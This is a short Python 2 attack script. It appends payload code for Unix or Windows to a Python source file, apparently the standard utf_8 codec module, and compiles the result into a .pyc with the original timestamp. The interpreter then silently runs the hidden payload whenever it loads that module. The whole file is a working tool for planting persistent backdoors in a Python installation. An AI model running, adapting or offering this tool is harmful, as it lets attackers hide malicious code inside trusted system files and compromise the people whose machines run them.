#!/usr/bin/env python

import struct
import sys
import os
import __builtin__
import imp
import marshal

class patch_pyc():
    def __init__(self, org_file, nix_payload=None, windows_payload=None):
        self.nix_payload = nix_payload
        self.windows_payload = windows_payload
        self.org_file = org_file
        self.temp_bytecode = ''
        
        self.read_payloads()
        self.get_bytecode()
        self.write_bytecode()
        self.write_file()

    def read_payloads(self):
        if self.nix_payload:
            self.nix = open(self.nix_payload, 'U').read()
        if self.windows_payload:
            self.windows = open(self.windows_payload, 'U').read()

    def get_bytecode(self):
        with open(self.org_file, 'U') as g:
            self.codestring = g.read()

    def write_bytecode(self):

        self.codestring += "\n"
        
        if self.nix_payload:
            self.codestring += self.nix
        if self.windows_payload:
            self.codestring += self.windows

        codeobject = __builtin__.compile(self.codestring, self.org_file, 'exec')
        self.temp_bytecode = marshal.dumps(codeobject)

    def write_file(self):
        pyc_file = self.org_file + "c"
        print "PYC file temp location:", pyc_file
        
        timestamp = int(os.stat(self.org_file).st_mtime)

        print "Timestamp of python file:", timestamp

        with open(pyc_file, 'w') as f:
            f.write(imp.get_magic())
            f.write(struct.pack("<I", timestamp))
            f.write(self.temp_bytecode)

        
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="To replace utf_8.pyc with your code...")
    parser.add_argument("-p", "--path", help="path to utf_8.pyc")
    parser.add_argument("-l", "--nix", help="payload for nix")
    parser.add_argument("-w", "--windows", help="payload for windows")
    args = parser.parse_args()
    
    if not args.path:
        parser.print_help()
        sys.exit()
    if not args.nix and not args.windows:
        parser.print_help()
        sys.exit()
    patch_pyc(args.path, args.nix, args.windows)
    print "Done"
